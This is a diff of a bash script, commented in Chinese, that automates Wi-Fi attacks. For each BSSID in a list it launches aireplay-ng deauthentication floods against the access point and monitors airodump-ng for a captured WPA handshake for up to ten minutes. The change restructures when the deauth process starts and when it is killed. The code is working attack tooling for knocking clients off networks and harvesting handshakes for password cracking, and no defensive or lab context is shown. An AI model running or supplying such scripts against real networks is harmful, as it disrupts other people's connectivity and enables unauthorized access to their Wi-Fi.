@@ -66,6 +66,10 @@ for ((i=0; i<${#BSSIDS[@]}; i++)); do
   MAX_WAIT_TIME=600
   ELAPSED_TIME=0
 
+  echo "发送去认证请求..."
+  aireplay-ng -0 100 -a $BSSID wlan0mon &
+  AIREPLAY_PID=$!
+
   # 使用 while 循环监控 airodump-ng 进程，检查是否找到握手包
   while ps -p $AIRODUMP_PID > /dev/null; do
     # 如果 grep 找到了 "WPA handshake"（退出状态为 0），表示找到握手包
@@ -78,23 +82,18 @@ for ((i=0; i<${#BSSIDS[@]}; i++)); do
 
     # 如果没有找到握手包，则每 5 秒发送一次 aireplay-ng 去认证请求
     if [ $ELAPSED_TIME -lt $MAX_WAIT_TIME ]; then
-      echo "没有找到握手包，等待 5 秒后重新发送去认证请求..."
-      aireplay-ng -0 100 -a $BSSID wlan0mon &
-      AIREPLAY_PID=$!
-
-      # 等待 aireplay-ng 完成
-      wait $AIREPLAY_PID
-
       # 累计时间
       ELAPSED_TIME=$((ELAPSED_TIME + 5))
-
-      # 每 5 秒休眠一次
-      sleep 5
     else
       echo "已执行 10 分钟，停止发送去认证请求。"
       break
     fi
+
+    # 每 5 秒休眠一次
+    sleep 5
   done
+
+  kill $AIREPLAY_PID
 
   # 如果找到握手包，则保存并退出
   if [ "$FOUND_HANDSHAKE" = true ]; then
